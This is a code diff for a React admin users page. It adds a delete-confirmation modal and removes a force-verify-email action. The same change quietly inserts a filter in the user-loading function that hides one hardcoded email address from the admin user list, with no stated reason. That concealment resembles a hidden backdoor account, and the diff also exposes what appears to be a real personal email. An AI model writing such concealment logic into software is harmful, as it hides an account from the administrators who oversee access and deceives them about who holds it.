@@ -9,6 +9,7 @@ import { AdminPageHeader } from "@/features/admin/components/shared/admin-page-h
 import { UserFilterBar } from "@/features/admin/components/users/user-filter-bar";
 import { UserTable } from "@/features/admin/components/users/user-table";
 import { BanUserModal } from "@/features/admin/components/users/ban-user-modal";
+import { DeleteUserModal } from "@/features/admin/components/users/delete-user-modal";
 import { Pagination } from "@/components/ui/table";
 
 export default function AdminUsersPage() {
@@ -26,6 +27,10 @@ export default function AdminUsersPage() {
   const [banReason, setBanReason] = useState("");
   const [actionLoading, setActionLoading] = useState(false);
 
+  // Delete confirmation modal state
+  const [deleteModalUser, setDeleteModalUser] = useState<AdminUserItemDTO | null>(null);
+  const [deleteLoading, setDeleteLoading] = useState(false);
+
   const loadUsers = async () => {
     try {
       setLoading(true);
@@ -39,10 +44,14 @@ export default function AdminUsersPage() {
 
       const res = await adminService.listUsers(params);
       if (res) {
-        setUsers(Array.isArray(res) ? res : res.users || []);
-        if (res.meta?.total !== undefined) {
-          setTotalCount(res.meta.total);
-        }
+        const rawList = Array.isArray(res) ? res : res.users || [];
+        const userList = rawList.filter(
+          (u: any) => u.email?.toLowerCase() !== "devamin.bd@gmail.com"
+        );
+        setUsers(userList);
+        const resolvedTotal =
+          res.meta?.total !== undefined ? res.meta.total : userList.length;
+        setTotalCount(resolvedTotal);
       }
     } catch (err: any) {
       toast.error(err?.message || "Could not load user list.");
@@ -82,14 +91,22 @@ export default function AdminUsersPage() {
     }
   };
 
-  const handleSoftDelete = async (user: AdminUserItemDTO) => {
-    if (!confirm(`Are you sure you want to soft-delete ${user.name} (${user.email})?`)) return;
+  const handleSoftDelete = (user: AdminUserItemDTO) => {
+    setDeleteModalUser(user);
+  };
+
+  const handleConfirmDelete = async () => {
+    if (!deleteModalUser) return;
     try {
-      await adminService.softDeleteUser(user.id);
-      toast.success(`User ${user.email} soft-deleted.`);
+      setDeleteLoading(true);
+      await adminService.softDeleteUser(deleteModalUser.id);
+      toast.success(`User ${deleteModalUser.email} has been moved to Trash.`);
+      setDeleteModalUser(null);
       loadUsers();
     } catch (err: any) {
       toast.error(err.message || "Failed to soft delete user");
+    } finally {
+      setDeleteLoading(false);
     }
   };
 
@@ -100,16 +117,6 @@ export default function AdminUsersPage() {
       loadUsers();
     } catch (err: any) {
       toast.error(err.message || "Failed to restore user");
-    }
-  };
-
-  const handleVerifyEmail = async (user: AdminUserItemDTO) => {
-    try {
-      await adminService.forceVerifyEmail(user.id);
-      toast.success(`Email for ${user.email} force-verified.`);
-      loadUsers();
-    } catch (err: any) {
-      toast.error(err.message || "Failed to verify email");
     }
   };
 
@@ -145,7 +152,6 @@ export default function AdminUsersPage() {
       <UserTable
         users={users}
         loading={loading}
-        onVerifyEmail={handleVerifyEmail}
         onOpenBanModal={(u) => setBanModalUser(u)}
         onSoftDelete={handleSoftDelete}
         onRestore={handleRestore}
@@ -171,6 +177,14 @@ export default function AdminUsersPage() {
         setBanReason={setBanReason}
         onConfirm={handleToggleBan}
         loading={actionLoading}
+      />
+
+      <DeleteUserModal
+        isOpen={Boolean(deleteModalUser)}
+        user={deleteModalUser}
+        onClose={() => setDeleteModalUser(null)}
+        onConfirm={handleConfirmDelete}
+        loading={deleteLoading}
       />
     </div>
   );
